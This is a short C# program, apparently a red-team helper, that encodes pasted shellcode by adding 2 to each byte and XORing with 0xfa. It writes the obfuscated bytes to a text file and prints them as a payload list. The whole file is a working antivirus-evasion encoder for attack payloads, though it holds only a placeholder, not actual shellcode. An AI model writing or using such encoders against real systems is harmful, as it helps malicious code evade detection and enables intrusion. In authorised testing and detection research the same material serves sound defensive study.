using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

// Declaring namespace for the program
namespace Helper
{
    // Main program class
    class Program
    {
        // Entry point of the program
        static void Main(string[] args)
        {
            // Original shellcode placeholder - replace !!!SHELLCODE!!! with your shellcode
            // in byte[] format
            byte[] buf = new byte[] { !!!SHELLCODE!!! };
           
            // Create a new byte array for the first encoded shellcode
            byte[] encoded1 = new byte[buf.Length]; 

            // First encoding: add 2 to every byte of the original shellcode
            for (int i = 0; i < buf.Length; i++)
                encoded1[i] = (byte)(((uint)buf[i] + 2) & 0xFF);

            // Create a new byte array for the final encoded shellcode
            byte[] encoded = new byte[buf.Length]; 

            // Second encoding: XOR every byte of the first encoded shellcode with 0xfa
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)encoded1[i] ^ 0xfa);
            }

            // Counter for formatting the shellcode output
            uint counter = 0;

            // StringBuilder for creating the shellcode string
            StringBuilder hex = new StringBuilder(encoded.Length * 2); 
            
            // Convert each byte in the encoded shellcode to hexadecimal and append to hex StringBuilder
            // Add a newline every 50 bytes for better readability
            foreach (byte b in buf)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if(counter % 50 == 0) { 
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            
            // Write the encoded shellcode to a file named "encoded_shellcode.txt"
            File.WriteAllText("encoded_shellcode.txt", hex.ToString());

            // Read the content of the "encoded_shellcode.txt" file
            string fileContent = File.ReadAllText("encoded_shellcode.txt");

            // Print the content of the "encoded_shellcode.txt" file to console
            Console.WriteLine("The payload is: " + fileContent);
        }
    }
}
